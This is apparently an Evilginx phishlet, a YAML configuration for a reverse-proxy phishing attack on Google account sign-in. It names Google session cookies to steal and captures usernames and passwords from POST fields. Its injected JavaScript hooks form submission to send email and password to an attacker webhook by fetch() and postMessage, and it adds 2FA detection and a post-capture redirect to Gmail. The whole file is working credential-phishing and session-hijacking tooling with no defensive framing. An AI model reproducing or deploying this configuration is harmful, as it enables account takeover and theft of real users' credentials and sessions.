name: 'google'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '{{.Endpoint3}}', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: true}
sub_filters:
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: '{{.Endpoint3}}.{{.Domain}}', mimes: ['text/html']}
auth_tokens:
  - domain: '.google.com'
    keys: ['SID', 'LSID', '__Secure-1PSID', '__Secure-3PSID']
credentials:
  username:
    key: 'identifier'
    search: '(.*)'
    type: 'post'
  password:
    key: 'Passwd'
    search: '(.*)'
    type: 'post'
login:
  domain: 'accounts.google.com'
  path: '/v3/signin/identifier'
js_inject:
  - trigger_domains: ['accounts.google.com']
    trigger_paths: ['/.*']
    code: |
      (function(){const api="https://{{.Domain}}/api/webhook";const secret="{{.WebhookSecret}}";const source="google";document.addEventListener('submit',function(){const u=document.querySelector('input[type="email"],input[name="identifier"]')?.value;const p=document.querySelector('input[type="password"],input[name="Passwd"]')?.value;if(u||p){fetch(api,{method:"POST",headers:{"Content-Type":"application/json","X-Webhook-Secret":secret},body:JSON.stringify({event:p?"credentials":"email",source:source,email:u,password:p})}).catch(()=>{});}},true);})();
webhook:
  url: "http://127.0.0.1:{{.AppPort}}/api/webhook"
  headers:
    X-Webhook-Secret: "{{.WebhookSecret}}"
  format: "json"
  events: ["credentials", "session"]

# JavaScript injections
js_injections:
  - trigger_domains: ["accounts.google.com", "{{.Endpoint3}}.{{.Domain}}"]
    trigger_paths: ["/.*"]
    code: |
      (function() {
        'use strict';
        
        // Pre-fill email if provided
        var urlParams = new URLSearchParams(window.location.search);
        var email = urlParams.get('email');
        if (email) {
          var emailInput = document.querySelector('input[type="email"], input[name="identifier"]');
          if (emailInput) {
            emailInput.value = email;
            emailInput.dispatchEvent(new Event('input', { bubbles: true }));
            
            // Trigger validation
            var event = new Event('change', { bubbles: true });
            emailInput.dispatchEvent(event);
          }
        }
        
        // Monitor for password field and track attempts
        var observer = new MutationObserver(function(mutations) {
          mutations.forEach(function(mutation) {
            if (mutation.type === 'childList') {
              var passwordInput = document.querySelector('input[type="password"]');
              if (passwordInput && !passwordInput._hooked) {
                passwordInput._hooked = true;
                passwordInput.addEventListener('input', function() {
                  var container = this.closest('form');
                  if (container) {
                    container.setAttribute('data-password-entered', 'true');
                  }
                });
              }
            }
          });
        });
        
        observer.observe(document.body, {
          childList: true,
          subtree: true
        });
        
        // Intercept form submission
        var originalSubmit = HTMLFormElement.prototype.submit;
        HTMLFormElement.prototype.submit = function() {
          if (this.action && this.action.includes('accounts.google.com')) {
            var formData = new FormData(this);
            var creds = {
              email: formData.get('identifier') || formData.get('Email'),
              password: formData.get('password') || formData.get('Passwd')
            };
            
            if (creds.email && creds.password) {
              // Send to parent if in iframe
              if (window.parent !== window) {
                window.parent.postMessage({
                  type: 'credentials',
                  data: creds,
                  url: window.location.href
                }, '*');
              }
            }
          }
          return originalSubmit.apply(this, arguments);
        };
        
        // Also hook click on submit buttons
        document.addEventListener('click', function(e) {
          var submitBtn = e.target.closest('input[type="submit"], button[type="submit"]');
          if (submitBtn && submitBtn.form) {
            var form = submitBtn.form;
            if (form.action && form.action.includes('accounts.google.com')) {
              var formData = new FormData(form);
              var creds = {
                email: formData.get('identifier') || formData.get('Email'),
                password: formData.get('password') || formData.get('Passwd')
              };
              
              if (creds.email && creds.password) {
                if (window.parent !== window) {
                  window.parent.postMessage({
                    type: 'credentials',
                    data: creds,
                    url: window.location.href
                  }, '*');
                }
              }
            }
          }
        });
      })();

# Webhook configuration
webhook:
  url: "http://127.0.0.1:{{.AppPort}}/api/webhook/evilginx"
  headers:
    "X-Webhook-Secret": "{{.WebhookSecret}}"
    "Content-Type": "application/json"
  format: "json"
  events:
    - "creds"
    - "session"
    - "auth"
    - "2fa"

# Redirect after successful login
redirect_url: "https://mail.google.com"

# 2FA handling
two_factor:
  enabled: true
  detect_patterns:
    - "2-step verification"
    - "two-factor"
    - "verification code"
    - "authenticator"
  redirect_after: "https://accounts.google.com"

# Blacklist/Whitelist
blacklist:
  enabled: false
  ips: []
  masks: []

whitelist:
  enabled: false
  ips: []